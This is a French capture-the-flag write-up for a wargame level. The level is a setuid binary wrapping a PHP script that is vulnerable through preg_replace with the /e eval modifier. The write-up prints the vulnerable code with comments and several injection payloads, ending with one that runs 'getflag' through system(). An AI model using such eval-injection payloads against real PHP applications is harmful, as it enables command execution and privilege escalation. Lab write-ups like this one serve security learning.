Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php

$ file level06
level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped
$ file level06.php
level06.php: a /usr/bin/php script, ASCII text executable
(Un executable unix et un script php)

$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
(Le binaire execute le script php et on dirait qu'il lui donne un arg)

./level06 coucou
PHP Warning:  file_get_contents(coucou): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
(Il doit prendre un fichier en argument)

script php :

<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
		// Lit un fichier dans une chaine
		$a = file_get_contents($y);
		// remplace des patterns par d'autre
		// le modifier "e" est la faille. il execute l'arg subsitution avec la fonction eval() qui execute une chaine comme un script php
		// http://www.murraypicton.com/archive/using-phps-preg_replace-with-the-e-modifier.php
		// si on construit une string compatible avec le pattern "/(\[x (.*)\])/e" il va l'executer
		// il execute "y(\"\\2\")" et utilise le resultat pour remplacer
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
}
$r = x($argv[1], $argv[2]);
// affiche la chaine transformée
print $r;
?>

"([x exec(getflag)])"

$ echo "([x exec(getflag)])" > /tmp/coucou
$ ./level06 /tmp/coucou
(exec(getflag))
(Arf il l'a affiché mais pas exec)

(comme l'exemple php.net)
$ echo '[x {${system("getflag")}}]' > /tmp/coucou
$ ./level06 "/tmp/coucou"
PHP Parse error:  syntax error, unexpected T_CONSTANT_ENCAPSED_STRING, expecting T_STRING in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code:
y("{${system(\"getflag\")}}") in /home/user/level06/level06.php on line 4
(Il a essayé d'executer mais le code est pas bon, il a ajouté '\' devant les "")

$ echo '[x {${system('getflag')}}]' > /tmp/coucou
$ ./level06 "/tmp/coucou"
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX
PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXX in /home/user/level06/level06.php(4) : regexp code on line 1
(YES)
